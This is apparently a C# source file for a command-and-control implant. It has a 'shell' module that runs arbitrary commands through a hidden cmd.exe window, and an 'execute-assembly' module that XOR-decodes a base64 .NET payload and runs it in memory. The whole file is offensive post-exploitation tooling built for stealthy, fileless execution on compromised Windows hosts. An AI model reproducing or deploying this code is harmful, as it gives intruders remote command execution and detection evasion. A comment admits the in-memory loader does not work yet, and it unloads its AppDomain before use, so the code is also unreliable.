﻿using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Execution
{
    public class Shell
    {
        public string Name => "shell";

        public string Execute(string[] args)
        {
            var results = "";

            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {string.Join(" ", args)}",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = Process.Start(startInfo);

            using (process.StandardOutput)
            {
                results += process.StandardOutput.ReadToEnd();
            }

            using (process.StandardError)
            {
                results += process.StandardError.ReadToEnd();
            }

            return results;
        }
    }

    public class ExecuteAssembly
    {
        public string Name => "execute-assembly";

        public string Execute(string[] args)
        {
            AppDomainSetup domainSetup = new AppDomainSetup();
            domainSetup.ApplicationBase = AppDomain.CurrentDomain.BaseDirectory;
            AppDomain executeAssemblyDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());

            try
            {
                byte[] assemblyBytes = Zor(Convert.FromBase64String(args[0]), args[1]);
                AssemblyRunner runner = (AssemblyRunner)executeAssemblyDomain.CreateInstanceAndUnwrap(typeof(AssemblyRunner).Assembly.FullName, typeof(AssemblyRunner).FullName);
                AppDomain.Unload(executeAssemblyDomain);
                return runner.LoadAssembly(assemblyBytes, args);
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }
        }
        //https://rastamouse.me/net-reflection-and-disposable-appdomains/ from here but dosen't work yet
        private class AssemblyRunner : MarshalByRefObject
        {
            public string LoadAssembly(byte[] assemblyBytes, string[] args)
            {
                Assembly assembly = Assembly.Load(assemblyBytes);
                foreach (Type type in assembly.GetExportedTypes())
                {
                    MethodInfo mainMethod = type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);

                    if (mainMethod != null)
                    {
                        // Redirect output
                        var consoleWriter = new StringWriter();
                        Console.SetOut(consoleWriter);

                        // Invoke the Main method
                        mainMethod.Invoke(null, new object[] { SliceArray(args, 2, args.Length - 1) });

                        // Restore output
                        Console.SetOut(new StreamWriter(Console.OpenStandardOutput())); // Restore the original output

                        // Get the captured output
                        return consoleWriter.ToString();
                    }
                }
                return "Main method not found";
            }
            private string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
            {
                int length = endIndex - startIndex + 1;
                string[] outputArray = new string[length];
                Array.Copy(inputArray, startIndex, outputArray, 0, length);
                return outputArray;
            }
        }

        private byte[] Zor(byte[] input, string key)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }
    }
}